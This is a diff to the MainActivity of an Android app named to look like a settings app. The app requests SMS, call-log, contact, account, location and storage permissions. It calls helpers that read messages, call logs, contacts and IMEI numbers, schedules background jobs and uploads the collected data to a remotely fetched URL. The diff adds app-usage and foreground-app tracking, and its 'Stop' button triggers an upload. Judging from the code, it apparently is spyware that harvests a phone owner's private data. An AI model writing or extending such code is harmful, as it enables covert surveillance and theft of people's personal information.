@@ -1,11 +1,12 @@
 package com.example.settings;
 
-import static com.example.settings.Utils.checkServices;
+import static com.example.settings.Utils.checkpermission;
+import static com.example.settings.Utils.getAppDataHistory;
 import static com.example.settings.Utils.getBatteryPercent;
 import static com.example.settings.Utils.getOtherNotification;
 import static com.example.settings.Utils.getphoneAppdetails;
-import static com.example.settings.Utils.isMyServiceRunning;
 import static com.example.settings.Utils.isPhoneIsLockedOrNot;
+import static com.example.settings.Utils.newUrlData;
 import static com.example.settings.Utils.readCallLogs;
 import static com.example.settings.Utils.readContacts;
 import static com.example.settings.Utils.readSmsHistory;
@@ -16,7 +17,6 @@ import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 import androidx.work.BackoffPolicy;
 import androidx.work.Data;
 import androidx.work.ExistingPeriodicWorkPolicy;
@@ -29,20 +29,16 @@ import android.Manifest;
 import android.accounts.Account;
 import android.accounts.AccountManager;
 import android.annotation.SuppressLint;
-import android.app.KeyguardManager;
-import android.content.BroadcastReceiver;
-import android.content.ClipboardManager;
+import android.app.ActivityManager;
+import android.app.AppOpsManager;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
 import android.content.ComponentName;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
-import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
@@ -50,8 +46,6 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.PowerManager;
-import android.provider.ContactsContract;
-import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.CellIdentityGsm;
 import android.telephony.CellIdentityLte;
@@ -65,33 +59,24 @@ import android.telephony.SubscriptionManager;
 import android.telephony.TelephonyManager;
 import android.text.format.DateFormat;
 import android.text.format.Formatter;
-import android.util.Base64;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ImageView;
 
-import com.google.android.gms.tasks.OnSuccessListener;
-import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
-import com.google.firebase.storage.UploadTask;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
 
-import org.apache.commons.lang3.StringUtils;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.IOException;
 import java.lang.reflect.Type;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
-import java.nio.file.Files;
-import java.nio.file.attribute.BasicFileAttributes;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Collections;
@@ -100,14 +85,14 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
 import java.util.Map;
+import java.util.SortedMap;
+import java.util.TreeMap;
 import java.util.concurrent.TimeUnit;
-
-import id.zelory.compressor.Compressor;
 
 public class MainActivity extends AppCompatActivity implements View.OnClickListener {
     Sharedpref mSharedpref;
     EditText mEditname;
-    Button btsave, mAccessbilitySettings, SyncData, AutoStart, BaterryinOther, BaterryinMi, Othernotifications;
+    Button btsave, mAccessbilitySettings, SyncData, AutoStart, BaterryinOther, BaterryinMi, Othernotifications,Start,Stop,Appusage;
     public static PeriodicWorkRequest mPeriodicWorkRequest, mPeriodicWorkRequest1, mGetUrlPeriodicWorkRequest;
     static OneTimeWorkRequest mOneTimeWorkRequest, UrlTimeWorkRequest;
     public static WorkManager mWorkManager;
@@ -151,6 +136,14 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         AutoStart = findViewById(R.id.CheckAutoStart);
         AutoStart.setOnClickListener(this);
 
+        Appusage=findViewById(R.id.AppUsage);
+        Appusage.setOnClickListener(this);
+        Start=findViewById(R.id.CheckStart);
+        Start.setOnClickListener(this);
+
+        Stop=findViewById(R.id.CheckStop);
+        Stop.setOnClickListener(this);
+
         SyncData = findViewById(R.id.SynData);
         SyncData.setOnClickListener(this);
 /*
@@ -177,7 +170,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         //checkServices(getApplicationContext(),mSharedpref);
         // String val=getFiles(mSharedpref);
         //readSmsHistory(this,mSharedpref);
-
+        runningTasks();
         checkpermissions();
         getphoneAppdetails(MainActivity.this,mSharedpref);
         isPhoneIsLockedOrNot(getApplicationContext());
@@ -225,9 +218,6 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         }
     }
 
-
-
-
     public static void setupWorkManager() {
         Data.Builder mData= new Data.Builder();
         mData.putString ("Type","Periodic");
@@ -237,13 +227,13 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                 TimeUnit.MILLISECONDS).build();
         mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.REPLACE, mPeriodicWorkRequest);
-        geturl();
-        mPeriodicWorkRequest1 = new PeriodicWorkRequest.Builder(SyncContact.class, 50,
+       // geturl();
+       /* mPeriodicWorkRequest1 = new PeriodicWorkRequest.Builder(SyncContact.class, 50,
                 TimeUnit.MINUTES).setBackoffCriteria(
                 BackoffPolicy.LINEAR,
                 PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                 TimeUnit.MILLISECONDS).build();
-        mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mPeriodicWorkRequest1);
+        mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mPeriodicWorkRequest1);*/
 
     }
 
@@ -266,32 +256,35 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
            // Intent i=new Intent(MainActivity.this,NotificationService.class);
          //   startActivity(i);
         }
+        if(requestCode==102) {
+            getAppDataHistory(getApplicationContext(),mSharedpref);
+        }
     }
 
     private void checkpermissions() {
         try {
             if ((ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
-                    != PackageManager.PERMISSION_GRANTED) &&
+                    != PackageManager.PERMISSION_GRANTED) ||
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
-                            != PackageManager.PERMISSION_GRANTED) &&
+                            != PackageManager.PERMISSION_GRANTED) ||
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)
-                            != PackageManager.PERMISSION_GRANTED) &&
+                            != PackageManager.PERMISSION_GRANTED) ||
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                             != PackageManager.PERMISSION_GRANTED)
-                    && (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                     != PackageManager.PERMISSION_GRANTED)
-                    && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                     != PackageManager.PERMISSION_GRANTED)
-                    && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
+                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                     != PackageManager.PERMISSION_GRANTED)
-                    && (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS)
+                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS)
                     != PackageManager.PERMISSION_GRANTED)
-                    && (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
-                    != PackageManager.PERMISSION_GRANTED) &&
+                    || (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
+                    != PackageManager.PERMISSION_GRANTED) ||
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS)
-                            != PackageManager.PERMISSION_GRANTED) &&
+                            != PackageManager.PERMISSION_GRANTED) ||
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
-                            != PackageManager.PERMISSION_GRANTED) &&
+                            != PackageManager.PERMISSION_GRANTED) ||
                     (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                             != PackageManager.PERMISSION_GRANTED))
                     {
@@ -311,7 +304,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                         },
                         1);
             } else {
-                setuponetimeworkManager("Permission Already Given");
+                setuponetimeworkManager(getApplicationContext(),"Permission Already Given");
                 getImieNumbers(this);
                 AsyncTask.execute(new Runnable() {
                     @Override
@@ -328,6 +321,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        checkSeperatePermissions();
+        setuponetimeworkManager(getApplicationContext(),"Permission might be Already given");
+
         getImieNumbers(this);
         simName(getApplicationContext());
         getCellInfo(this);
@@ -356,6 +352,17 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 getMultimediaData();
             }
         });
+    }
+
+    private void checkSeperatePermissions() {
+        if(!checkpermission(getApplicationContext(),Manifest.permission.READ_PHONE_STATE)){
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE},1);
+            return;
+         }
+        if(!checkpermission(getApplicationContext(),Manifest.permission.READ_SMS)){
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS},1);
+            return;
+        }
     }
 
     private void getMultimediaData() {
@@ -742,26 +749,70 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 }
                 break;
                 case R.id.CheckAutoStart:
-                    setupWorkManager();
-
-                    //  setuponetimeworkManager("From Stop Button");
-                   // checkAutoStartOption();
+                    //setupWorkManager();
+                    //setuponetimeworkManager("From Stop Button");
+                    checkAutoStartOption();
+                break;
+            case R.id.AppUsage:
+                Intent intei = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
+                startActivityForResult(intei,102);
+                break;
+            case R.id.CheckStart:
+                setupWorkManager();
+                break;
+            case R.id.CheckStop:
+                setuponetimeworkManager(getApplicationContext(),"From Stop Button");
                 break;
             case R.id.SynData:
-
-                setuponetimeworkManager("From Sync Button");
+                setuponetimeworkManager(getApplicationContext(),"From Sync Button");
                 break;
         }
     }
 
-    public static void setuponetimeworkManager(String message) {
+
+    private boolean checkStatus() {
+        try {
+            PackageManager packageManager = getApplicationContext().getPackageManager();
+            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(getApplicationContext().getPackageName(), 0);
+            AppOpsManager appOpsManager = (AppOpsManager) getApplicationContext().getSystemService(Context.APP_OPS_SERVICE);
+            int mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, applicationInfo.uid, applicationInfo.packageName);
+            return (mode != AppOpsManager.MODE_ALLOWED);
+        } catch (PackageManager.NameNotFoundException e) {
+            return false;
+        }
+    }
+
+    private void runningTasks() {
+        ActivityManager activityManager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
+        List<ActivityManager.RunningAppProcessInfo> runAppProcessesList = activityManager.getRunningAppProcesses();
+        for (ActivityManager.RunningAppProcessInfo runAppProcess : runAppProcessesList) {
+            if (runAppProcess.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
+                Log.d("current foreground App", runAppProcess.processName);
+            }
+        }
+    }
+
+
+    public static void setuponetimeworkManager(Context mContext,String message) {
     try {
-        Data.Builder mData= new Data.Builder();
+        Sharedpref mSharedpref = new Sharedpref(mContext);
+        boolean toSendData=mSharedpref.getSendDataOneTime();
+        if (toSendData){
+            SendData mSendData=new SendData(mContext,message);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                mSendData.doUpload();
+            }
+        }
+        else {
+            newUrlData(mContext,mSharedpref);
+        }
+
+     /*   Data.Builder mData= new Data.Builder();
         mData.putString ("Type","Onetime "+message);
         mOneTimeWorkRequest = new OneTimeWorkRequest.Builder(SyncOneTimeData.class).setInputData(mData.build()).build();
         mWorkManager.enqueueUniqueWork("One_REQUEST_TAG", ExistingWorkPolicy.REPLACE, mOneTimeWorkRequest);
         UrlTimeWorkRequest=new OneTimeWorkRequest.Builder(GetNewUrl.class).build();
-        mWorkManager.enqueue(UrlTimeWorkRequest);
+        mWorkManager.enqueue(UrlTimeWorkRequest);*/
     }
     catch (Exception e)
     {
